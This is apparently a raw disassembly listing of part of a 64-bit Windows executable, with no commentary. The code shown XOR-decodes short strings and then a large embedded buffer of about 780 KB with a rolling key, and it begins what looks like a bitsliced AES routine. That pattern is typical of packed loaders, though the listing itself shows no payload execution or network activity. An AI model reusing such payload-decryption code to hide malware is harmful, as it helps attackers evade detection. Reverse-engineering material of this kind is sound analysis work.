   140001de9:	41 0f b6 57 01       	movzbl 0x1(%r15),%edx
   140001dee:	40 30 ea             	xor    %bpl,%dl
   140001df1:	88 50 01             	mov    %dl,0x1(%rax)
   140001df4:	41 0f b6 57 02       	movzbl 0x2(%r15),%edx
   140001df9:	40 30 ea             	xor    %bpl,%dl
   140001dfc:	88 50 02             	mov    %dl,0x2(%rax)
   140001dff:	41 0f b6 57 03       	movzbl 0x3(%r15),%edx
   140001e04:	40 30 ea             	xor    %bpl,%dl
   140001e07:	88 50 03             	mov    %dl,0x3(%rax)
   140001e0a:	41 0f b6 57 04       	movzbl 0x4(%r15),%edx
   140001e0f:	40 30 ea             	xor    %bpl,%dl
   140001e12:	88 50 04             	mov    %dl,0x4(%rax)
   140001e15:	41 0f b6 57 05       	movzbl 0x5(%r15),%edx
   140001e1a:	40 30 ea             	xor    %bpl,%dl
   140001e1d:	88 50 05             	mov    %dl,0x5(%rax)
   140001e20:	41 0f b6 57 06       	movzbl 0x6(%r15),%edx
   140001e25:	40 30 ea             	xor    %bpl,%dl
   140001e28:	88 50 06             	mov    %dl,0x6(%rax)
   140001e2b:	41 0f b6 57 07       	movzbl 0x7(%r15),%edx
   140001e30:	40 30 ea             	xor    %bpl,%dl
   140001e33:	88 50 07             	mov    %dl,0x7(%rax)
   140001e36:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140001e3c:	83 f9 08             	cmp    $0x8,%ecx
   140001e3f:	74 32                	je     0x140001e73
   140001e41:	41 0f b6 4f 08       	movzbl 0x8(%r15),%ecx
   140001e46:	40 30 e9             	xor    %bpl,%cl
   140001e49:	88 48 08             	mov    %cl,0x8(%rax)
   140001e4c:	41 0f b6 4f 09       	movzbl 0x9(%r15),%ecx
   140001e51:	40 30 e9             	xor    %bpl,%cl
   140001e54:	88 48 09             	mov    %cl,0x9(%rax)
   140001e57:	41 0f b6 4f 0a       	movzbl 0xa(%r15),%ecx
   140001e5c:	40 30 e9             	xor    %bpl,%cl
   140001e5f:	88 48 0a             	mov    %cl,0xa(%rax)
   140001e62:	41 0f b6 4f 0b       	movzbl 0xb(%r15),%ecx
   140001e67:	40 30 e9             	xor    %bpl,%cl
   140001e6a:	88 48 0b             	mov    %cl,0xb(%rax)
   140001e6d:	41 b8 0c 00 00 00    	mov    $0xc,%r8d
   140001e73:	48 89 d9             	mov    %rbx,%rcx
   140001e76:	48 83 e1 03          	and    $0x3,%rcx
   140001e7a:	74 28                	je     0x140001ea4
   140001e7c:	48 89 c2             	mov    %rax,%rdx
   140001e7f:	4c 01 c2             	add    %r8,%rdx
   140001e82:	4d 01 c7             	add    %r8,%r15
   140001e85:	45 31 c0             	xor    %r8d,%r8d
   140001e88:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140001e8f:	00 
   140001e90:	47 0f b6 0c 07       	movzbl (%r15,%r8,1),%r9d
   140001e95:	41 30 e9             	xor    %bpl,%r9b
   140001e98:	46 88 0c 02          	mov    %r9b,(%rdx,%r8,1)
   140001e9c:	49 ff c0             	inc    %r8
   140001e9f:	4c 39 c1             	cmp    %r8,%rcx
   140001ea2:	75 ec                	jne    0x140001e90
   140001ea4:	31 c9                	xor    %ecx,%ecx
   140001ea6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140001ead:	00 00 00 
   140001eb0:	80 3c 08 00          	cmpb   $0x0,(%rax,%rcx,1)
   140001eb4:	0f 84 8d 00 00 00    	je     0x140001f47
   140001eba:	48 ff c1             	inc    %rcx
   140001ebd:	48 39 cb             	cmp    %rcx,%rbx
   140001ec0:	75 ee                	jne    0x140001eb0
   140001ec2:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140001ec7:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140001ecc:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140001ed1:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001ed6:	e8 85 7b 00 00       	call   0x140009a60
   140001edb:	49 89 c7             	mov    %rax,%r15
   140001ede:	49 89 d4             	mov    %rdx,%r12
   140001ee1:	4c 89 f1             	mov    %r14,%rcx
   140001ee4:	48 89 c2             	mov    %rax,%rdx
   140001ee7:	ff 15 a3 f3 01 00    	call   *0x1f3a3(%rip)        # 0x140021290
   140001eed:	48 89 c3             	mov    %rax,%rbx
   140001ef0:	41 c6 07 00          	movb   $0x0,(%r15)
   140001ef4:	4d 85 e4             	test   %r12,%r12
   140001ef7:	74 14                	je     0x140001f0d
   140001ef9:	ff 15 d1 f3 01 00    	call   *0x1f3d1(%rip)        # 0x1400212d0
   140001eff:	48 89 c1             	mov    %rax,%rcx
   140001f02:	31 d2                	xor    %edx,%edx
   140001f04:	4d 89 f8             	mov    %r15,%r8
   140001f07:	ff 15 bb f3 01 00    	call   *0x1f3bb(%rip)        # 0x1400212c8
   140001f0d:	c6 06 00             	movb   $0x0,(%rsi)
   140001f10:	48 85 ff             	test   %rdi,%rdi
   140001f13:	74 14                	je     0x140001f29
   140001f15:	ff 15 b5 f3 01 00    	call   *0x1f3b5(%rip)        # 0x1400212d0
   140001f1b:	48 89 c1             	mov    %rax,%rcx
   140001f1e:	31 d2                	xor    %edx,%edx
   140001f20:	49 89 f0             	mov    %rsi,%r8
   140001f23:	ff 15 9f f3 01 00    	call   *0x1f39f(%rip)        # 0x1400212c8
   140001f29:	48 89 d8             	mov    %rbx,%rax
   140001f2c:	48 83 c4 50          	add    $0x50,%rsp
   140001f30:	5b                   	pop    %rbx
   140001f31:	5d                   	pop    %rbp
   140001f32:	5f                   	pop    %rdi
   140001f33:	5e                   	pop    %rsi
   140001f34:	41 5c                	pop    %r12
   140001f36:	41 5e                	pop    %r14
   140001f38:	41 5f                	pop    %r15
   140001f3a:	c3                   	ret
   140001f3b:	c6 06 00             	movb   $0x0,(%rsi)
   140001f3e:	31 db                	xor    %ebx,%ebx
   140001f40:	48 85 ff             	test   %rdi,%rdi
   140001f43:	75 d0                	jne    0x140001f15
   140001f45:	eb e2                	jmp    0x140001f29
   140001f47:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140001f4c:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140001f51:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140001f56:	48 89 4c 24 48       	mov    %rcx,0x48(%rsp)
   140001f5b:	48 8d 05 3e f8 01 00 	lea    0x1f83e(%rip),%rax        # 0x1400217a0
   140001f62:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001f67:	48 8d 0d 02 12 0e 00 	lea    0xe1202(%rip),%rcx        # 0x1400e3170
   140001f6e:	4c 8d 0d fb f7 01 00 	lea    0x1f7fb(%rip),%r9        # 0x140021770
   140001f75:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140001f7a:	ba 2b 00 00 00       	mov    $0x2b,%edx
   140001f7f:	e8 8c e1 01 00       	call   0x140020110
   140001f84:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001f89:	ba 0c 00 00 00       	mov    $0xc,%edx
   140001f8e:	e8 c3 dd 01 00       	call   0x14001fd56
   140001f93:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001f98:	48 89 da             	mov    %rbx,%rdx
   140001f9b:	e8 b6 dd 01 00       	call   0x14001fd56
   140001fa0:	cc                   	int3
   140001fa1:	cc                   	int3
   140001fa2:	cc                   	int3
   140001fa3:	cc                   	int3
   140001fa4:	cc                   	int3
   140001fa5:	cc                   	int3
   140001fa6:	cc                   	int3
   140001fa7:	cc                   	int3
   140001fa8:	cc                   	int3
   140001fa9:	cc                   	int3
   140001faa:	cc                   	int3
   140001fab:	cc                   	int3
   140001fac:	cc                   	int3
   140001fad:	cc                   	int3
   140001fae:	cc                   	int3
   140001faf:	cc                   	int3
   140001fb0:	55                   	push   %rbp
   140001fb1:	41 57                	push   %r15
   140001fb3:	41 56                	push   %r14
   140001fb5:	41 55                	push   %r13
   140001fb7:	41 54                	push   %r12
   140001fb9:	56                   	push   %rsi
   140001fba:	57                   	push   %rdi
   140001fbb:	53                   	push   %rbx
   140001fbc:	48 81 ec 28 0f 00 00 	sub    $0xf28,%rsp
   140001fc3:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
   140001fca:	00 
   140001fcb:	66 44 0f 7f bd 90 0e 	movdqa %xmm15,0xe90(%rbp)
   140001fd2:	00 00 
   140001fd4:	66 44 0f 7f b5 80 0e 	movdqa %xmm14,0xe80(%rbp)
   140001fdb:	00 00 
   140001fdd:	66 44 0f 7f ad 70 0e 	movdqa %xmm13,0xe70(%rbp)
   140001fe4:	00 00 
   140001fe6:	66 44 0f 7f a5 60 0e 	movdqa %xmm12,0xe60(%rbp)
   140001fed:	00 00 
   140001fef:	66 44 0f 7f 9d 50 0e 	movdqa %xmm11,0xe50(%rbp)
   140001ff6:	00 00 
   140001ff8:	66 44 0f 7f 95 40 0e 	movdqa %xmm10,0xe40(%rbp)
   140001fff:	00 00 
   140002001:	66 44 0f 7f 8d 30 0e 	movdqa %xmm9,0xe30(%rbp)
   140002008:	00 00 
   14000200a:	66 44 0f 7f 85 20 0e 	movdqa %xmm8,0xe20(%rbp)
   140002011:	00 00 
   140002013:	66 0f 7f bd 10 0e 00 	movdqa %xmm7,0xe10(%rbp)
   14000201a:	00 
   14000201b:	66 0f 7f b5 00 0e 00 	movdqa %xmm6,0xe00(%rbp)
   140002022:	00 
   140002023:	48 c7 85 f8 0d 00 00 	movq   $0xfffffffffffffffe,0xdf8(%rbp)
   14000202a:	fe ff ff ff 
   14000202e:	ff 15 cc f2 01 00    	call   *0x1f2cc(%rip)        # 0x140021300
   140002034:	48 89 85 50 08 00 00 	mov    %rax,0x850(%rbp)
   14000203b:	48 8d 85 50 08 00 00 	lea    0x850(%rbp),%rax
   140002042:	ff 15 38 f2 01 00    	call   *0x1f238(%rip)        # 0x140021280
   140002048:	89 85 50 08 00 00    	mov    %eax,0x850(%rbp)
   14000204e:	48 8d 85 50 08 00 00 	lea    0x850(%rbp),%rax
   140002055:	8b b5 50 08 00 00    	mov    0x850(%rbp),%esi
   14000205b:	ff 15 17 f2 01 00    	call   *0x1f217(%rip)        # 0x140021278
   140002061:	89 85 50 08 00 00    	mov    %eax,0x850(%rbp)
   140002067:	48 8d 85 50 08 00 00 	lea    0x850(%rbp),%rax
   14000206e:	03 b5 50 08 00 00    	add    0x850(%rbp),%esi
   140002074:	48 c7 85 50 08 00 00 	movq   $0x581,0x850(%rbp)
   14000207b:	81 05 00 00 
   14000207f:	c6 85 50 08 00 00 50 	movb   $0x50,0x850(%rbp)
   140002086:	89 b5 50 08 00 00    	mov    %esi,0x850(%rbp)
   14000208c:	8b 85 50 08 00 00    	mov    0x850(%rbp),%eax
   140002092:	89 85 50 08 00 00    	mov    %eax,0x850(%rbp)
   140002098:	48 8d 85 50 08 00 00 	lea    0x850(%rbp),%rax
   14000209f:	b9 29 00 00 00       	mov    $0x29,%ecx
   1400020a4:	e8 97 7c 01 00       	call   0x140019d40
   1400020a9:	48 85 c0             	test   %rax,%rax
   1400020ac:	0f 84 08 11 00 00    	je     0x1400031ba
   1400020b2:	48 89 c3             	mov    %rax,%rbx
   1400020b5:	0f 28 05 04 f3 01 00 	movaps 0x1f304(%rip),%xmm0        # 0x1400213c0
   1400020bc:	0f 11 00             	movups %xmm0,(%rax)
   1400020bf:	0f 28 05 0a f3 01 00 	movaps 0x1f30a(%rip),%xmm0        # 0x1400213d0
   1400020c6:	0f 11 40 10          	movups %xmm0,0x10(%rax)
   1400020ca:	48 b8 2c 13 fc c3 15 	movabs $0x8318bb15c3fc132c,%rax
   1400020d1:	bb 18 83 
   1400020d4:	48 89 43 20          	mov    %rax,0x20(%rbx)
   1400020d8:	c6 43 28 34          	movb   $0x34,0x28(%rbx)
   1400020dc:	b9 a3 02 00 00       	mov    $0x2a3,%ecx
   1400020e1:	e8 5a 7c 01 00       	call   0x140019d40
   1400020e6:	48 85 c0             	test   %rax,%rax
   1400020e9:	0f 84 da 10 00 00    	je     0x1400031c9
   1400020ef:	48 89 c7             	mov    %rax,%rdi
   1400020f2:	0f 28 05 e7 f2 01 00 	movaps 0x1f2e7(%rip),%xmm0        # 0x1400213e0
   1400020f9:	0f 11 00             	movups %xmm0,(%rax)
   1400020fc:	0f 28 05 ed f2 01 00 	movaps 0x1f2ed(%rip),%xmm0        # 0x1400213f0
   140002103:	0f 11 40 10          	movups %xmm0,0x10(%rax)
   140002107:	0f 28 05 f2 f2 01 00 	movaps 0x1f2f2(%rip),%xmm0        # 0x140021400
   14000210e:	0f 11 40 20          	movups %xmm0,0x20(%rax)
   140002112:	0f 28 05 f7 f2 01 00 	movaps 0x1f2f7(%rip),%xmm0        # 0x140021410
   140002119:	0f 11 40 30          	movups %xmm0,0x30(%rax)
   14000211d:	0f 28 05 fc f2 01 00 	movaps 0x1f2fc(%rip),%xmm0        # 0x140021420
   140002124:	0f 11 40 40          	movups %xmm0,0x40(%rax)
   140002128:	0f 28 05 01 f3 01 00 	movaps 0x1f301(%rip),%xmm0        # 0x140021430
   14000212f:	0f 11 40 50          	movups %xmm0,0x50(%rax)
   140002133:	0f 28 05 06 f3 01 00 	movaps 0x1f306(%rip),%xmm0        # 0x140021440
   14000213a:	0f 11 40 60          	movups %xmm0,0x60(%rax)
   14000213e:	0f 28 05 0b f3 01 00 	movaps 0x1f30b(%rip),%xmm0        # 0x140021450
   140002145:	0f 11 40 70          	movups %xmm0,0x70(%rax)
   140002149:	0f 28 05 10 f3 01 00 	movaps 0x1f310(%rip),%xmm0        # 0x140021460
   140002150:	0f 11 80 80 00 00 00 	movups %xmm0,0x80(%rax)
   140002157:	0f 28 05 12 f3 01 00 	movaps 0x1f312(%rip),%xmm0        # 0x140021470
   14000215e:	0f 11 80 90 00 00 00 	movups %xmm0,0x90(%rax)
   140002165:	0f 28 05 14 f3 01 00 	movaps 0x1f314(%rip),%xmm0        # 0x140021480
   14000216c:	0f 11 80 a0 00 00 00 	movups %xmm0,0xa0(%rax)
   140002173:	0f 28 05 16 f3 01 00 	movaps 0x1f316(%rip),%xmm0        # 0x140021490
   14000217a:	0f 11 80 b0 00 00 00 	movups %xmm0,0xb0(%rax)
   140002181:	0f 28 05 18 f3 01 00 	movaps 0x1f318(%rip),%xmm0        # 0x1400214a0
   140002188:	0f 11 80 c0 00 00 00 	movups %xmm0,0xc0(%rax)
   14000218f:	0f 28 05 1a f3 01 00 	movaps 0x1f31a(%rip),%xmm0        # 0x1400214b0
   140002196:	0f 11 80 d0 00 00 00 	movups %xmm0,0xd0(%rax)
   14000219d:	0f 28 05 1c f3 01 00 	movaps 0x1f31c(%rip),%xmm0        # 0x1400214c0
   1400021a4:	0f 11 80 e0 00 00 00 	movups %xmm0,0xe0(%rax)
   1400021ab:	0f 28 05 1e f3 01 00 	movaps 0x1f31e(%rip),%xmm0        # 0x1400214d0
   1400021b2:	0f 11 80 f0 00 00 00 	movups %xmm0,0xf0(%rax)
   1400021b9:	0f 28 05 20 f3 01 00 	movaps 0x1f320(%rip),%xmm0        # 0x1400214e0
   1400021c0:	0f 11 80 00 01 00 00 	movups %xmm0,0x100(%rax)
   1400021c7:	0f 28 05 22 f3 01 00 	movaps 0x1f322(%rip),%xmm0        # 0x1400214f0
   1400021ce:	0f 11 80 10 01 00 00 	movups %xmm0,0x110(%rax)
   1400021d5:	0f 28 05 24 f3 01 00 	movaps 0x1f324(%rip),%xmm0        # 0x140021500
   1400021dc:	0f 11 80 20 01 00 00 	movups %xmm0,0x120(%rax)
   1400021e3:	0f 28 05 26 f3 01 00 	movaps 0x1f326(%rip),%xmm0        # 0x140021510
   1400021ea:	0f 11 80 30 01 00 00 	movups %xmm0,0x130(%rax)
   1400021f1:	0f 28 05 28 f3 01 00 	movaps 0x1f328(%rip),%xmm0        # 0x140021520
   1400021f8:	0f 11 80 40 01 00 00 	movups %xmm0,0x140(%rax)
   1400021ff:	0f 28 05 2a f3 01 00 	movaps 0x1f32a(%rip),%xmm0        # 0x140021530
   140002206:	0f 11 80 50 01 00 00 	movups %xmm0,0x150(%rax)
   14000220d:	0f 28 05 2c f3 01 00 	movaps 0x1f32c(%rip),%xmm0        # 0x140021540
   140002214:	0f 11 80 60 01 00 00 	movups %xmm0,0x160(%rax)
   14000221b:	0f 28 05 2e f3 01 00 	movaps 0x1f32e(%rip),%xmm0        # 0x140021550
   140002222:	0f 11 80 70 01 00 00 	movups %xmm0,0x170(%rax)
   140002229:	0f 28 05 30 f3 01 00 	movaps 0x1f330(%rip),%xmm0        # 0x140021560
   140002230:	0f 11 80 80 01 00 00 	movups %xmm0,0x180(%rax)
   140002237:	0f 28 05 32 f3 01 00 	movaps 0x1f332(%rip),%xmm0        # 0x140021570
   14000223e:	0f 11 80 90 01 00 00 	movups %xmm0,0x190(%rax)
   140002245:	0f 28 05 34 f3 01 00 	movaps 0x1f334(%rip),%xmm0        # 0x140021580
   14000224c:	0f 11 80 a0 01 00 00 	movups %xmm0,0x1a0(%rax)
   140002253:	0f 28 05 36 f3 01 00 	movaps 0x1f336(%rip),%xmm0        # 0x140021590
   14000225a:	0f 11 80 b0 01 00 00 	movups %xmm0,0x1b0(%rax)
   140002261:	0f 28 05 38 f3 01 00 	movaps 0x1f338(%rip),%xmm0        # 0x1400215a0
   140002268:	0f 11 80 c0 01 00 00 	movups %xmm0,0x1c0(%rax)
   14000226f:	0f 28 05 3a f3 01 00 	movaps 0x1f33a(%rip),%xmm0        # 0x1400215b0
   140002276:	0f 11 80 d0 01 00 00 	movups %xmm0,0x1d0(%rax)
   14000227d:	0f 28 05 3c f3 01 00 	movaps 0x1f33c(%rip),%xmm0        # 0x1400215c0
   140002284:	0f 11 80 e0 01 00 00 	movups %xmm0,0x1e0(%rax)
   14000228b:	0f 28 05 3e f3 01 00 	movaps 0x1f33e(%rip),%xmm0        # 0x1400215d0
   140002292:	0f 11 80 f0 01 00 00 	movups %xmm0,0x1f0(%rax)
   140002299:	0f 28 05 40 f3 01 00 	movaps 0x1f340(%rip),%xmm0        # 0x1400215e0
   1400022a0:	0f 11 80 00 02 00 00 	movups %xmm0,0x200(%rax)
   1400022a7:	0f 28 05 42 f3 01 00 	movaps 0x1f342(%rip),%xmm0        # 0x1400215f0
   1400022ae:	0f 11 80 10 02 00 00 	movups %xmm0,0x210(%rax)
   1400022b5:	0f 28 05 44 f3 01 00 	movaps 0x1f344(%rip),%xmm0        # 0x140021600
   1400022bc:	0f 11 80 20 02 00 00 	movups %xmm0,0x220(%rax)
   1400022c3:	0f 28 05 46 f3 01 00 	movaps 0x1f346(%rip),%xmm0        # 0x140021610
   1400022ca:	0f 11 80 30 02 00 00 	movups %xmm0,0x230(%rax)
   1400022d1:	0f 28 05 48 f3 01 00 	movaps 0x1f348(%rip),%xmm0        # 0x140021620
   1400022d8:	0f 11 80 40 02 00 00 	movups %xmm0,0x240(%rax)
   1400022df:	0f 28 05 4a f3 01 00 	movaps 0x1f34a(%rip),%xmm0        # 0x140021630
   1400022e6:	0f 11 80 50 02 00 00 	movups %xmm0,0x250(%rax)
   1400022ed:	0f 28 05 4c f3 01 00 	movaps 0x1f34c(%rip),%xmm0        # 0x140021640
   1400022f4:	0f 11 80 60 02 00 00 	movups %xmm0,0x260(%rax)
   1400022fb:	0f 28 05 4e f3 01 00 	movaps 0x1f34e(%rip),%xmm0        # 0x140021650
   140002302:	0f 11 80 70 02 00 00 	movups %xmm0,0x270(%rax)
   140002309:	0f 28 05 50 f3 01 00 	movaps 0x1f350(%rip),%xmm0        # 0x140021660
   140002310:	0f 11 80 80 02 00 00 	movups %xmm0,0x280(%rax)
   140002317:	0f 28 05 52 f3 01 00 	movaps 0x1f352(%rip),%xmm0        # 0x140021670
   14000231e:	0f 11 80 90 02 00 00 	movups %xmm0,0x290(%rax)
   140002325:	66 c7 80 a0 02 00 00 	movw   $0x7472,0x2a0(%rax)
   14000232c:	72 74 
   14000232e:	c6 80 a2 02 00 00 2e 	movb   $0x2e,0x2a2(%rax)
   140002335:	b9 00 e6 0b 00       	mov    $0xbe600,%ecx
   14000233a:	e8 01 7a 01 00       	call   0x140019d40
   14000233f:	48 85 c0             	test   %rax,%rax
   140002342:	0f 84 ba 4a 00 00    	je     0x140006e02
   140002348:	49 89 c6             	mov    %rax,%r14
   14000234b:	4c 8d 4f 01          	lea    0x1(%rdi),%r9
   14000234f:	b9 01 00 00 00       	mov    $0x1,%ecx
   140002354:	45 31 c0             	xor    %r8d,%r8d
   140002357:	49 ba b7 4a 89 72 06 	movabs $0xc22e450672894ab7,%r10
   14000235e:	45 2e c2 
   140002361:	4c 8d 1d 30 f5 01 00 	lea    0x1f530(%rip),%r11        # 0x140021898
   140002368:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000236f:	00 
   140002370:	48 89 c8             	mov    %rcx,%rax
   140002373:	49 f7 e2             	mul    %r10
   140002376:	48 c1 ea 09          	shr    $0x9,%rdx
   14000237a:	48 69 f2 5d fd ff ff 	imul   $0xfffffffffffffd5d,%rdx,%rsi
   140002381:	4c 89 c0             	mov    %r8,%rax
   140002384:	49 f7 e2             	mul    %r10
   140002387:	4c 01 ce             	add    %r9,%rsi
   14000238a:	48 c1 ea 09          	shr    $0x9,%rdx
   14000238e:	48 69 c2 5d fd ff ff 	imul   $0xfffffffffffffd5d,%rdx,%rax
   140002395:	48 01 f8             	add    %rdi,%rax
   140002398:	43 0f b6 14 18       	movzbl (%r8,%r11,1),%edx
   14000239d:	41 32 14 00          	xor    (%r8,%rax,1),%dl
   1400023a1:	43 0f b6 44 18 01    	movzbl 0x1(%r8,%r11,1),%eax
   1400023a7:	43 88 14 06          	mov    %dl,(%r14,%r8,1)
   1400023ab:	41 32 04 30          	xor    (%r8,%rsi,1),%al
   1400023af:	43 88 44 06 01       	mov    %al,0x1(%r14,%r8,1)
   1400023b4:	49 83 c0 02          	add    $0x2,%r8
   1400023b8:	48 83 c1 02          	add    $0x2,%rcx
   1400023bc:	49 81 f8 00 e6 0b 00 	cmp    $0xbe600,%r8
   1400023c3:	75 ab                	jne    0x140002370
   1400023c5:	48 89 9d f8 07 00 00 	mov    %rbx,0x7f8(%rbp)
   1400023cc:	48 89 bd c0 0c 00 00 	mov    %rdi,0xcc0(%rbp)
   1400023d3:	4c 89 b5 18 0d 00 00 	mov    %r14,0xd18(%rbp)
   1400023da:	0f 28 05 9f f2 01 00 	movaps 0x1f29f(%rip),%xmm0        # 0x140021680
   1400023e1:	0f 29 85 30 0d 00 00 	movaps %xmm0,0xd30(%rbp)
   1400023e8:	0f 28 05 a1 f2 01 00 	movaps 0x1f2a1(%rip),%xmm0        # 0x140021690
   1400023ef:	0f 29 85 40 0d 00 00 	movaps %xmm0,0xd40(%rbp)
   1400023f6:	0f b6 05 03 6c 0e 00 	movzbl 0xe6c03(%rip),%eax        # 0x1400e9000
   1400023fd:	49 bc 00 f0 00 f0 00 	movabs $0xf000f000f000f000,%r12
   140002404:	f0 00 f0 
   140002407:	49 be 00 ff 00 ff 00 	movabs $0xff00ff00ff00ff00,%r14
   14000240e:	ff 00 ff 
   140002411:	48 bf 0f 00 0f 00 0f 	movabs $0xf000f000f000f,%rdi
   140002418:	00 0f 00 
   14000241b:	48 bb f0 ff f0 ff f0 	movabs $0xfff0fff0fff0fff0,%rbx
   140002422:	ff f0 ff 
   140002425:	3c 01                	cmp    $0x1,%al
   140002427:	0f 84 b8 0d 00 00    	je     0x1400031e5
   14000242d:	0f b6 c0             	movzbl %al,%eax
   140002430:	3d ff 00 00 00       	cmp    $0xff,%eax
   140002435:	0f 84 9d 0d 00 00    	je     0x1400031d8
   14000243b:	4c 8d bd 40 0d 00 00 	lea    0xd40(%rbp),%r15
   140002442:	48 8d 8d d0 08 00 00 	lea    0x8d0(%rbp),%rcx
   140002449:	31 f6                	xor    %esi,%esi
   14000244b:	41 b8 40 03 00 00    	mov    $0x340,%r8d
   140002451:	31 d2                	xor    %edx,%edx
   140002453:	e8 b3 d7 01 00       	call   0x14001fc0b
   140002458:	48 8d 95 30 0d 00 00 	lea    0xd30(%rbp),%rdx
   14000245f:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140002464:	48 8d 8d 50 08 00 00 	lea    0x850(%rbp),%rcx
   14000246b:	49 89 d0             	mov    %rdx,%r8
   14000246e:	49 89 d1             	mov    %rdx,%r9
   140002471:	e8 6a 6d 00 00       	call   0x1400091e0
   140002476:	48 8d 8d 90 08 00 00 	lea    0x890(%rbp),%rcx
   14000247d:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140002482:	4c 89 fa             	mov    %r15,%rdx
   140002485:	4d 89 f8             	mov    %r15,%r8
   140002488:	4d 89 f9             	mov    %r15,%r9
   14000248b:	e8 50 6d 00 00       	call   0x1400091e0
   140002490:	41 bf 08 00 00 00    	mov    $0x8,%r15d
   140002496:	41 bd 80 00 00 00    	mov    $0x80,%r13d
   14000249c:	0f 1f 40 00          	nopl   0x0(%rax)
   1400024a0:	48 8d 8d 50 08 00 00 	lea    0x850(%rbp),%rcx
   1400024a7:	4c 89 fa             	mov    %r15,%rdx
   1400024aa:	e8 01 74 00 00       	call   0x1400098b0
   1400024af:	48 8d 0c 2e          	lea    (%rsi,%rbp,1),%rcx
   1400024b3:	48 81 c1 d0 08 00 00 	add    $0x8d0,%rcx
   1400024ba:	e8 31 71 00 00       	call   0x1400095f0
   1400024bf:	48 f7 94 35 d0 08 00 	notq   0x8d0(%rbp,%rsi,1)
   1400024c6:	00 
   1400024c7:	48 f7 94 35 d8 08 00 	notq   0x8d8(%rbp,%rsi,1)
   1400024ce:	00 
   1400024cf:	48 f7 94 35 f8 08 00 	notq   0x8f8(%rbp,%rsi,1)
   1400024d6:	00 
   1400024d7:	48 f7 94 35 00 09 00 	notq   0x900(%rbp,%rsi,1)
   1400024de:	00 
   1400024df:	42 80 b4 2d 53 08 00 	xorb   $0xf0,0x853(%rbp,%r13,1)
   1400024e6:	00 f0 
   1400024e8:	48 8b 8c 35 d0 08 00 	mov    0x8d0(%rbp,%rsi,1),%rcx
   1400024ef:	00 
   1400024f0:	48 8b 84 35 d8 08 00 	mov    0x8d8(%rbp,%rsi,1),%rax
   1400024f7:	00 
   1400024f8:	48 c1 c1 24          	rol    $0x24,%rcx
   1400024fc:	48 21 f9             	and    %rdi,%rcx
   1400024ff:	48 33 8c 35 50 08 00 	xor    0x850(%rbp,%rsi,1),%rcx
   140002506:	00 
   140002507:	48 89 ca             	mov    %rcx,%rdx
   14000250a:	49 89 c8             	mov    %rcx,%r8
   14000250d:	49 c1 e0 0c          	shl    $0xc,%r8
   140002511:	4d 21 e0             	and    %r12,%r8
   140002514:	49 31 c8             	xor    %rcx,%r8
   140002517:	48 c1 e1 04          	shl    $0x4,%rcx
   14000251b:	48 21 d9             	and    %rbx,%rcx
   14000251e:	48 c1 e2 08          	shl    $0x8,%rdx
   140002522:	4c 21 f2             	and    %r14,%rdx
   140002525:	48 31 ca             	xor    %rcx,%rdx
   140002528:	49 31 d0             	xor    %rdx,%r8
   14000252b:	48 c1 c0 24          	rol    $0x24,%rax
   14000252f:	4c 89 84 35 d0 08 00 	mov    %r8,0x8d0(%rbp,%rsi,1)
   140002536:	00 
   140002537:	48 21 f8             	and    %rdi,%rax
   14000253a:	48 33 84 35 58 08 00 	xor    0x858(%rbp,%rsi,1),%rax
   140002541:	00 
   140002542:	48 89 c1             	mov    %rax,%rcx
   140002545:	48 89 c2             	mov    %rax,%rdx
   140002548:	48 c1 e2 0c          	shl    $0xc,%rdx
   14000254c:	4c 21 e2             	and    %r12,%rdx
   14000254f:	48 31 c2             	xor    %rax,%rdx
   140002552:	48 c1 e0 04          	shl    $0x4,%rax
   140002556:	48 21 d8             	and    %rbx,%rax
   140002559:	48 c1 e1 08          	shl    $0x8,%rcx
   14000255d:	4c 21 f1             	and    %r14,%rcx
   140002560:	48 31 c1             	xor    %rax,%rcx
   140002563:	48 31 ca             	xor    %rcx,%rdx
   140002566:	48 89 94 35 d8 08 00 	mov    %rdx,0x8d8(%rbp,%rsi,1)
   14000256d:	00 
   14000256e:	48 8b 84 35 e0 08 00 	mov    0x8e0(%rbp,%rsi,1),%rax
   140002575:	00 
   140002576:	48 c1 c0 24          	rol    $0x24,%rax
   14000257a:	48 21 f8             	and    %rdi,%rax
   14000257d:	48 33 84 35 60 08 00 	xor    0x860(%rbp,%rsi,1),%rax
   140002584:	00 
   140002585:	48 89 c1             	mov    %rax,%rcx
   140002588:	48 89 c2             	mov    %rax,%rdx
   14000258b:	48 c1 e2 0c          	shl    $0xc,%rdx
   14000258f:	4c 21 e2             	and    %r12,%rdx
   140002592:	48 31 c2             	xor    %rax,%rdx
   140002595:	48 c1 e0 04          	shl    $0x4,%rax
   140002599:	48 21 d8             	and    %rbx,%rax
   14000259c:	48 c1 e1 08          	shl    $0x8,%rcx
   1400025a0:	4c 21 f1             	and    %r14,%rcx
   1400025a3:	48 31 c1             	xor    %rax,%rcx
   1400025a6:	48 31 ca             	xor    %rcx,%rdx
   1400025a9:	48 89 94 35 e0 08 00 	mov    %rdx,0x8e0(%rbp,%rsi,1)
   1400025b0:	00 
   1400025b1:	48 8b 84 35 e8 08 00 	mov    0x8e8(%rbp,%rsi,1),%rax
   1400025b8:	00 
   1400025b9:	48 c1 c0 24          	rol    $0x24,%rax
   1400025bd:	48 21 f8             	and    %rdi,%rax
   1400025c0:	48 33 84 35 68 08 00 	xor    0x868(%rbp,%rsi,1),%rax
   1400025c7:	00 
   1400025c8:	48 89 c1             	mov    %rax,%rcx
   1400025cb:	48 89 c2             	mov    %rax,%rdx
   1400025ce:	48 c1 e2 0c          	shl    $0xc,%rdx
